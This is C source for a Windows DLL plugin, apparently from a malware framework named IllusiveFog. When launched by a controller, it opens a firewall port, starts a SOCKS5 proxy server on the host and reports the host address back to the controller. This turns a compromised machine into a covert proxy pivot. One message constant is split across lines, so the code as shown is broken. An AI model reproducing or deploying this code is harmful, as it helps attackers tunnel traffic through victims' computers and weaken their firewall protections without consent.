#include "selfsocks5.h"
void socks_thread2(Psocks_negotitate_info socks_info) {

	server_negotitatie(socks_info);
	sockscleanup(socks_info);
	//freeheap(socks_info);
	ExitThread(0);
}
void socks_thread1(Psocks_server_info socks_info) {
	HANDLE last_thread[MAX_SOCKS_THREAD];
	DWORD threadid = 0;
	DWORD dwcount = 0;
	struct socks_negotitate_info* socket_negotiate_info = allocheap(sizeof(struct socks_negotitate_info) * MAX_SOCKS_THREAD); /** socket_negotiate_info = allocheap(sizeof(socks_negotiate_info) * MAX_SOCKS_THREAD);*/

	while (1) {
		for (int i = 0; i < MAX_SOCKS_THREAD; i++) {

			if (accepted_server_request(socks_info, &socket_negotiate_info[i])) {

				last_thread[i] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)socks_thread2, &socket_negotiate_info[i], NULL, NULL);
				if (WaitForSingleObject(socks_info->thread_event1, 0) == WAIT_OBJECT_0) {
					goto end_thread;
				}
				Sleep(16);

			}

			else {
				if (WaitForSingleObject(socks_info->thread_event1, 0) == WAIT_OBJECT_0) {
					goto end_thread;
				}
				continue;
			}

		}
		for (int j = 0; j < MAX_SOCKS_THREAD; j++) {

			TerminateThread(last_thread[j], 0);

		}

		continue;
	end_thread:
		for (int x = 0; x < MAX_SOCKS_THREAD; x++) {
			TerminateThread(last_thread[x], 0);

		}
		Sleep(0x800); 
		freeheap(socket_negotiate_info);
		ExitThread(0);


	}


}
__declspec(dllexport)void thread(HANDLE localevent) {
	MSG msg;
	Psocks_server_info socks_info = NULL;
	char* port = NULL;
	HANDLE hthread = NULL;
	DWORD dwthreadid = 0;
	ULONG status = 0;
	char* host = allocheap(MAX_HOST);
	char* socket_port = NULL;
	while (!PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE)) {
		SetEvent(localevent);
		GetMessage(&msg, NULL, NULL, NULL);
		if (msg.message == WM_
			
			_PLUGIN_LAUNCH) {
			Pplugin_param param = (Pplugin_param)msg.lParam;
			if (socks_info == NULL) {
				socks_info = allocheap(sizeof(socks_server_info));
				ZeroMemory(socks_info, sizeof(socks_server_info));
				ZeroMemory(host, MAX_HOST);
				get_current_host(host, &status);
				status = 0;
				socks_info->socketserver_ip = host;

				socks_info->socketserver_port = StrToIntA(param->param);
				socket_port = param->param;
				if (socks_info->socketserver_port == NULL) {
					socks_info->socketserver_port = StrToIntA(param->param + 1);
					socket_port = param->param + 1;
				}
				ZeroMemory(socks_info->socket_port, 100);
				strcpy(socks_info->socket_port, socket_port);
				OutputDebugStringA(socks_info->socket_port);
				set_fw_rule(FALSE, socks_info->socket_port);
				initialize_server(socks_info, &status);
				socks_info->thread_event1 = CreateEvent(NULL, NULL, NULL, NULL);
				socks_info->socket_thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)socks_thread1, (LPVOID)socks_info, NULL, &dwthreadid);
				SetThreadPriority(socks_info->socket_thread, THREAD_PRIORITY_BELOW_NORMAL);
				report(param->reporter_event, param->reporter_threadid, host);
				report(param->reporter_event, param->reporter_threadid, NULL);
				SetEvent(localevent);
				ResetEvent(localevent);
				continue;
			}
		}
		else if (msg.message == WM_IllusiveFog_PLUGIN_TERMINATE) {

			SetEvent(socks_info->thread_event1);
			if (WaitForSingleObject(socks_info->socket_thread, 0) != WAIT_OBJECT_0)
				WaitForSingleObject(socks_info->socket_thread, INFINITE);

			shutdown(socks_info->bind_server, SD_SEND);
			closesocket(socks_info->bind_server);
			set_fw_rule(TRUE, socks_info->socket_port);

			freeheap(socks_info);
			freeheap(host);

			WSACleanup();
			
			ExitThread(0);
		}
	}

}

BOOL  DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

